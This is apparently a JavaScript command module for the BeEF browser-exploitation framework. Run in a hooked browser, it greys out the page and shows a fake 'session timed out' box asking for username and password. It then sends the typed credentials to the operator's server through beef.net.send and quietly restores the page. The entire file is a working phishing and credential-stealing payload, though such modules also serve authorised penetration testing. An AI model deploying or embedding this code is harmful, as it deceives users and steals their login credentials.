//
//   Copyright 2011 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {
  
	imgr = "<%== @imgsauce %>";
	var answer= '';
	// set up darkening
	function grayOut(vis, options) {
	  // Pass true to gray out screen, false to ungray
	  // options are optional.  This is a JSON object with the following (optional) properties
	  // opacity:0-100         // Lower number = less grayout higher = more of a blackout 
	  // zindex: #             // HTML elements with a higher zindex appear on top of the gray out
	  // bgcolor: (#xxxxxx)    // Standard RGB Hex color code
	  // grayOut(true, {'zindex':'50', 'bgcolor':'#0000FF', 'opacity':'70'});
	  // Because options is JSON opacity/zindex/bgcolor are all optional and can appear
	  // in any order.  Pass only the properties you need to set.
	  var options = options || {};
	  var zindex = options.zindex || 50;
	  var opacity = options.opacity || 70;
	  var opaque = (opacity / 100);
	  var bgcolor = options.bgcolor || '#000000';
	  var dark=document.getElementById('darkenScreenObject');
	  if (!dark) {
	    // The dark layer doesn't exist, it's never been created.  So we'll
	    // create it here and apply some basic styles.
	    // If you are getting errors in IE see: http://support.microsoft.com/default.aspx/kb/927917
	    var tbody = document.getElementsByTagName("body")[0];
	    var tnode = document.createElement('div');           // Create the layer.
	        tnode.style.position='absolute';                 // Position absolutely
	        tnode.style.top='0px';                           // In the top
	        tnode.style.left='0px';                          // Left corner of the page
	        tnode.style.overflow='hidden';                   // Try to avoid making scroll bars            
	        tnode.style.display='none';                      // Start out Hidden
	        tnode.id='darkenScreenObject';                   // Name it so we can find it later
	    tbody.appendChild(tnode);                            // Add it to the web page
	    dark=document.getElementById('darkenScreenObject');  // Get the object.
	  }
	  if (vis) {
	    // Calculate the page width and height 
	    if( document.body && ( document.body.scrollWidth || document.body.scrollHeight ) ) {
	        var pageWidth = document.body.scrollWidth+'px';
	        var pageHeight = document.body.scrollHeight+'px';
	    } else if( document.body.offsetWidth ) {
	      var pageWidth = document.body.offsetWidth+'px';
	      var pageHeight = document.body.offsetHeight+'px';
	    } else {
	       var pageWidth='100%';
	       var pageHeight='100%';
	    }
	    //set the shader to cover the entire page and make it visible.
	    dark.style.opacity=opaque;
	    dark.style.MozOpacity=opaque;
	    dark.style.filter='alpha(opacity='+opacity+')';
	    dark.style.zIndex=zindex;
	    dark.style.backgroundColor=bgcolor;
	    dark.style.width= pageWidth;
	    dark.style.height= pageHeight;
	    dark.style.display='block';
	  } else {
	     dark.style.display='none';
	  }
	}

	// function to send response
	function win(){
		document.getElementById('hax').innerHtml='<h2>Thank you for re-authenticating, you will now be returned to the application</h2>';
		answer = document.getElementById('uname').value+':'+document.getElementById('pass').value;
	}

	// perform darkening
	grayOut(true);

	function checker(){
		processval = document.body.lastChild.getElementsByTagName("input")[2].value;
		if (processval == "Processing..") {
			uname = document.body.lastChild.getElementsByTagName("input")[0].value;
			pass = document.body.lastChild.getElementsByTagName("input")[1].value;
			answer = uname+":"+pass
  			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'answer='+answer);	
			// set lastchild invisible
			document.body.lastChild.setAttribute('style','display:none');
			// lighten screen
			grayOut(false);
			clearInterval(credgrabber);
		}
	}


	// floating div
	function writeit() {
		sneakydiv = document.createElement('div');
		sneakydiv.setAttribute('id', 'hax');
		sneakydiv.setAttribute('style', 'width:400px;height:320px;position:absolute; top:30%; left:40%; z-index:51; background-color:ffffff;font-family:\'Arial\',Arial,sans-serif;border-width:thin;border-style:solid;border-color:#000000');
		sneakydiv.setAttribute('align', 'center');
		document.body.appendChild(sneakydiv);
		sneakydiv.innerHTML= '<br><img src=\''+imgr+'\' width=\'80px\' height\'80px\' /><h2>Your session has timed out!</h2><p>For your security, your session has been timed out. To continue browsing this site, please re-enter your username and password below.</p><table border=\'0\'><tr><td>Username:</td><td><input type=\'text\' name=\'uname\' id=\'uname\' value=\'\'></input></td></td><tr><td>Password:</td><td><input type=\'password\' name=\'pass\' id=\'pass\' value=\'\'></input></td></tr></table><br><input type=\'button\' name=\'lul\' id=\'lul\' onClick=\'document.getElementById(\"lul\").value=\"Processing..\";\' value=\'Continue\'>';
		credgrabber = setInterval(checker,1000);

	}
	
	writeit();


});
